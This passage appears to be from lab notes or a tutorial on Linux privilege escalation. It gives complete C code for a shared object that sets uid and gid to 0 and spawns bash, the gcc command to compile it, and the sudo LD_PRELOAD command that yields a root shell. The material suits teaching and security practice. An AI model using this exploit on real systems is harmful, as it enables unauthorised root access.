The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![[Pasted image 20220924173130.png]]

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

![[Pasted image 20220924173215.png]]


